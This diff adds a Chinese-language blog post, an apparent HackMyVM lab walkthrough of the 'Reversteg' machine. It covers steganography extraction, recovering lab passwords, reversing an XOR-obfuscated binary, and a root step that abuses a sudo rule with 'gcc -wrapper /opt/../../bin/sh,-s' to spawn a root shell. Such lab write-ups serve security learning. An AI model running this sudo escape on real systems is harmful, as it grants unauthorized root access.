@@ -1,0 +1,234 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm_reversteg | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="扫描  80的的源码发现 117db0148dc179a2c2245c5a30e63ab0 根据提示是一张图片 加上jpg即可 图片用随波逐流直接梭  morainelake为steghide密码 提取出的压缩包密码也是morainelake ┌──(root㉿kali)-[&#x2F;myift&#x2F;reversbeg]└─# steghide extract -sf 1.jpg --passphrase">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackmyvm_reversteg">
+<meta property="og:url" content="http://example.com/2025/05/29/hackmyvm-reversteg/index.html">
+<meta property="og:site_name" content="myift">
+<meta property="og:description" content="扫描  80的的源码发现 117db0148dc179a2c2245c5a30e63ab0 根据提示是一张图片 加上jpg即可 图片用随波逐流直接梭  morainelake为steghide密码 提取出的压缩包密码也是morainelake ┌──(root㉿kali)-[&#x2F;myift&#x2F;reversbeg]└─# steghide extract -sf 1.jpg --passphrase">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/png.png">
+<meta property="article:published_time" content="2025-05-29T13:27:35.000Z">
+<meta property="article:modified_time" content="2025-05-29T13:32:55.883Z">
+<meta property="article:author" content="dgh">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "hackmyvm_reversteg",
+  "url": "http://example.com/2025/05/29/hackmyvm-reversteg/",
+  "image": "http://example.com/image/png.png",
+  "datePublished": "2025-05-29T13:27:35.000Z",
+  "dateModified": "2025-05-29T13:32:55.883Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "dgh",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/05/29/hackmyvm-reversteg/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hackmyvm_reversteg',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm_reversteg</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm_reversteg</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-29T13:27:35.000Z" title="发表于 2025-05-29 21:27:35">2025-05-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-29T13:32:55.883Z" title="更新于 2025-05-29 21:32:55">2025-05-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../imgs/$%7Bfiilename%7D/image-20250524181332574.png" alt="image-20250524181332574"></p>
+<p>扫描</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250524163121844.png" alt="image-20250524163121844"></p>
+<p>80的的源码发现</p>
+<p>117db0148dc179a2c2245c5a30e63ab0</p>
+<p>根据提示是一张图片</p>
+<p>加上jpg即可</p>
+<p>图片用随波逐流直接梭</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250524163301452.png" alt="image-20250524163301452"></p>
+<p>morainelake为steghide密码</p>
+<p>提取出的压缩包密码也是morainelake</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# steghide extract -sf 1.jpg --passphrase morainelake </span><br><span class="line">wrote extracted data to &quot;secret.zip&quot;.</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# ls</span><br><span class="line">1.jpg  secret.zip</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# unzip secret.zip </span><br><span class="line">Archive:  secret.zip</span><br><span class="line">   creating: secret/</span><br><span class="line">[secret.zip] secret/secret.txt password: </span><br><span class="line"> extracting: secret/secret.txt   </span><br><span class="line"> </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# ls</span><br><span class="line">1.jpg  secret  secret.zip</span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg]</span><br><span class="line">└─# cd secret   </span><br><span class="line">                                                                                                                                                                         </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg/secret]</span><br><span class="line">└─# l </span><br><span class="line">secret.txt</span><br><span class="line">                                                                                                                                                                      </span><br><span class="line">┌──(root㉿kali)-[/myift/reversbeg/secret]</span><br><span class="line">└─# cat secret.txt </span><br><span class="line">morainelake:660930334</span><br><span class="line">                                 </span><br></pre></td></tr></table></figure>
+
+<p>前期踩点的时候就知道开启的有22端口ssh服务</p>
+<p>我们直接尝试的登陆即可</p>
+<p>在history发现一堆flag</p>
+<p>直接bp爆破提交即可</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image-20250524174640732.png" alt="image-20250524174640732"></p>
+<p>在&#x2F;opt下发现reverse</p>
+<p>我拉去下来放到idea中分析(re是不可能会的)</p>
+<p>下面内容来源于sunset</p>
+<p><a target="_blank" rel="noopener" href="https://sunsetaction.top/2025/04/03/HackMyVMReversteg/">https://sunsetaction.top/2025/04/03/HackMyVMReversteg/</a></p>
+<p>分析来自于：<code>Grok</code></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">puts</span>(<span class="string">&quot;Enter passwords or Enter H coward mode:&quot;</span>);</span><br><span class="line">v20 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">__isoc99_scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;v4[<span class="number">7</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_">strcmp</span>(&amp;v4[<span class="number">7</span>], <span class="string">&quot;H&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v20 == <span class="number">100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_">puts</span>(<span class="string">&quot;Hint: Invert XOR Replace! &quot;</span>);</span><br><span class="line">        goto <span class="variable constant_">LABEL_6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">strcpy</span>(dest, &amp;v4[<span class="number">7</span>]);</span><br><span class="line"><span class="title function_">__isoc99_scanf</span>(<span class="string">&quot;%s %s %s&quot;</span>, v10, &amp;v9, &amp;v8);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>提示用户输入密码，或者输入 “<code>H</code>“ 进入所谓的 “<code>coward mode</code>“。</li>
+<li>对用户输入的密码进行处理，并通过 <code>XOR</code> 解密和凯撒解密操作生成验证所需的数据。</li>
+<li>使用 <code>check_passwords</code> 函数验证输入的密码是否正确。</li>
+<li>如果验证通过，输出成功消息并解密一个隐藏字符串；否则，提示密码错误</li>
+<li>当用户输入的不是 “<code>H</code>“ 时，假设这是第一个密码，将其复制到 <code>dest</code> 中。</li>
+<li>接着，使用 <code>scanf</code> 读取另外三个字符串，分别存储到 <code>v10</code>、<code>v9</code> 和 <code>v8</code> 中。这可能是验证所需的额外输入</li>
+</ul>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="attr">LABEL_6</span>:</span><br><span class="line">v7 = <span class="number">8203321</span>;</span><br><span class="line"><span class="title function_">strcpy</span>(v6, <span class="string">&quot;/, 8:(&quot;</span>);</span><br><span class="line"><span class="title function_">strcpy</span>((char *)&amp;v5 + <span class="number">7</span>, <span class="string">&quot;!!|&#125;yx&#123;z&quot;</span>);</span><br><span class="line"><span class="title function_">strcpy</span>((char *)&amp;v5, <span class="string">&quot;(;$)(#&quot;</span>);</span><br><span class="line">v19 = <span class="number">77</span>;</span><br><span class="line">v18 = (<span class="keyword">void</span> *)<span class="title function_">xor_decrypt</span>((char *)&amp;v5 + <span class="number">7</span>, 77LL);</span><br><span class="line">v17 = (<span class="keyword">void</span> *)<span class="title function_">xor_decrypt</span>(v6, (unsigned int)v19);</span><br><span class="line">v16 = (char *)<span class="title function_">xor_decrypt</span>(&amp;v7, (unsigned int)v19);</span><br><span class="line">v15 = (char *)<span class="title function_">xor_decrypt</span>(&amp;v5, (unsigned int)v19);</span><br></pre></td></tr></table></figure>
+
+<p>初始化数据<code>XOR</code>解密，解密</p>
+<p><code>v17 = (void *)xor_decrypt(v6, (unsigned int)v19);</code> &#x3D;&#x3D; <code>bamuwe</code> （眼熟）</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image130.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v15 = (char *)xor_decrypt(&amp;v5, (unsigned int)v19);` == `eviden</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/$%7Bfiilename%7D/image131.png" alt="image.png"></p>
+<p><code>v18 = (void *)xor_decrypt((char *)&amp;v5 + 7, 77LL);</code> &#x3D;&#x3D; <code>ll104567</code> （群主）</p>
+<p><img src="/../imgs/$%7Bfiilename%7D/image132.png" alt="image.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v16 = (char *)xor_decrypt(&amp;v7, (unsigned int)v19);` == `ta0</span><br></pre></td></tr></table></figure>
+
+<p><code>v16</code>不能直接在<code>CyberChef</code>里面转，否则会变成乱码，因为<code>v7</code>是<code>int</code>格式，而<code>(char *)xor_decrypt</code> 需要将<code>v7</code>转为<code>Sting</code>格式</p>
+<p>我们将其代码扒下来，直接打印<code>v16</code> ，我们创建<code>v16.c</code></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;stdlib.<span class="property">h</span>&gt;</span><br><span class="line">#include &lt;string.<span class="property">h</span>&gt;</span><br><span class="line"></span><br><span class="line">typedef unsigned char _BYTE;</span><br><span class="line"></span><br><span class="line">_BYTE *<span class="title function_">xor_decrypt</span>(<span class="params"><span class="keyword">const</span> char *a1, char a2</span>)</span><br><span class="line">&#123;</span><br><span class="line">    _BYTE *v3;</span><br><span class="line">    int v4;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    v4 = <span class="title function_">strlen</span>(a1);</span><br><span class="line">    v3 = <span class="title function_">malloc</span>(v4 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v4; ++i)</span><br><span class="line">        v3[i] = a2 ^ a1[i];</span><br><span class="line">    v3[v4] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int <span class="title function_">main</span>(<span class="params"></span>)</span><br><span class="line">&#123;</span><br><span class="line">    int v7 = <span class="number">8203321</span>;</span><br><span class="line">    char v19 = <span class="number">77</span>;</span><br><span class="line">    char *v16;</span><br><span class="line"></span><br><span class="line">    v16 = (char *)<span class="title function_">xor_decrypt</span>((<span class="keyword">const</span> char *)&amp;v7, (unsigned int)v19);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">printf</span>(<span class="string">&quot;v16 content: %s\n&quot;</span>, v16);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">free</span>(v16);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后编译并运行，得出<code>v16</code>是<code>ta0</code></p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"> ⚡ root@kali  ~<span class="regexp">/Desktop/</span>test/reverseteg  vim v16.<span class="property">c</span></span><br><span class="line"> ⚡ root@kali  ~<span class="regexp">/Desktop/</span>test/reverseteg  gcc v16.<span class="property">c</span> -o v16                                       </span><br><span class="line"> ⚡ root@kali  ~<span class="regexp">/Desktop/</span>test/reverseteg  ./v16    </span><br><span class="line">v16 <span class="attr">content</span>: ta0</span><br></pre></td></tr></table></figure>
+
+<p>那我们就得出<code>v15</code>-<code>v18</code>分别是<code>eviden</code> 、<code>ta0</code> 、<code>bamuwe</code> 、<code>ll104567</code></p>
+<p>然后程序调用<code>checkpassword</code>函数</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (unsigned int)<span class="title function_">check_passwords</span>((int)dest, (int)v10, (int)&amp;v9, (int)&amp;v8, (int)v18, (int)v17, v16, v15) )</span><br></pre></td></tr></table></figure>
+
+<p>最后根据参数我们依次输入密码</p>
+<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">$ ./reverse</span><br><span class="line"><span class="title class_">Enter</span> passwords or <span class="title class_">Enter</span> H coward <span class="attr">mode</span>:</span><br><span class="line">ll104567</span><br><span class="line">bamuwe</span><br><span class="line">ta0</span><br><span class="line">eviden</span><br><span class="line">[+] <span class="title class_">Enter</span> the password successfully! you <span class="attr">know</span>: flower</span><br></pre></td></tr></table></figure>
+
+<p>得到密码<code>flower</code> ？或者<code>ll104567bamuweta0eviden</code></p>
+<p>得到了一个密码</p>
+<p>结合我们前面信息收集到的welcome用户</p>
+<p>直接登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for welcome on reversteg:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User welcome may run the following commands on reversteg:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>*可逃逸</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/gcc -wrapper /opt/../../bin/sh,-s .</span><br><span class="line">这个命令的作用是：</span><br><span class="line"></span><br><span class="line">利用 gcc -wrapper 的能力，指定 /bin/sh 替代 gcc；</span><br><span class="line"></span><br><span class="line">-s 作为 sh 的参数，表示让 shell 读取命令自标准输入（-s 是 sh 的合法参数）；</span><br><span class="line"></span><br><span class="line">. 是 gcc 所要求的最后一个参数（随便给个文件名占位）；</span><br><span class="line"></span><br><span class="line">由于你使用的是 sudo，并且目标是 /bin/sh，你最终会以 root 权限获得一个 shell！</span><br></pre></td></tr></table></figure>
+
+<p>然后在&#x2F;root下找到flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/29/hackmyvm-reversteg/">http://example.com/2025/05/29/hackmyvm-reversteg/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/29/hackmyvm-Pycrt/" title="hackmyvm_Pycrt"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm_Pycrt</div></div><div class="info-2"><div class="info-item-1">扫描  80端口只有一个默认的apache页面没有扫描出其他的页面  但是 端口6667有个IRC服务(互联网中继聊天服务) 我们nc连接并发送一些标准的IRC命令来注册你的昵称和用户信息 ┌──(root㉿kali)-[~]└─# nc 192.168.56.106 6667:irc.local NOTICE * :*** Looking up your hostname...NICK kali_pentester:irc.local NOTICE * :*** Could not resolve your hostname: Request timed out; using your IP address (192.168.56.103) instead.USER kali 0 * :Kali Pentester:irc.local 001 kali_pentester :Welcome to the Localnet IRC Network kali_pentester!kali@192.168.56.103:irc.local 002 kali_pentester...</div></div></div></a><a class="pagination-related" href="/2025/05/29/hackmyvm-KrustyKrab/" title="hackmyvm_KrustyKrab"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm_KrustyKrab</div></div><div class="info-2"><div class="info-item-1"> 踩点  80端口访问是一个Apache 默认页 在源码中得到 &#x2F;var&#x2F;www&#x2F;html&#x2F;finexo 访问finexo 有登录功能  第一个用户存在 在登录页面的源码中发现js文件   很明显的jsfuck 解出 function generateCaptcha() &#123;    $characters = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;    $code = &quot;&quot;;    $seed = time();    mt_srand($seed);    for ($i = 0; $i &lt; 4; $i++) &#123;        $code .= $characters[mt_rand(0, strlen($characters) - 1)];    &#125;    $_SESSION[&#x27;captcha&#x27;] = strtolower($code);   ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd">hackmyvm_todd</a><time datetime="2025-05-29T13:29:17.000Z" title="发表于 2025-05-29 21:29:17">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Matrioshka/" title="hackmyvm_Matrioshka">hackmyvm_Matrioshka</a><time datetime="2025-05-29T13:29:07.000Z" title="发表于 2025-05-29 21:29:07">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc04/" title="hackmyvm_dc04">hackmyvm_dc04</a><time datetime="2025-05-29T13:28:50.000Z" title="发表于 2025-05-29 21:28:50">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-always/" title="hackmyvm_always">hackmyvm_always</a><time datetime="2025-05-29T13:28:35.000Z" title="发表于 2025-05-29 21:28:35">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Principle/" title="hackmyvm_Principle">hackmyvm_Principle</a><time datetime="2025-05-29T13:28:25.000Z" title="发表于 2025-05-29 21:28:25">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
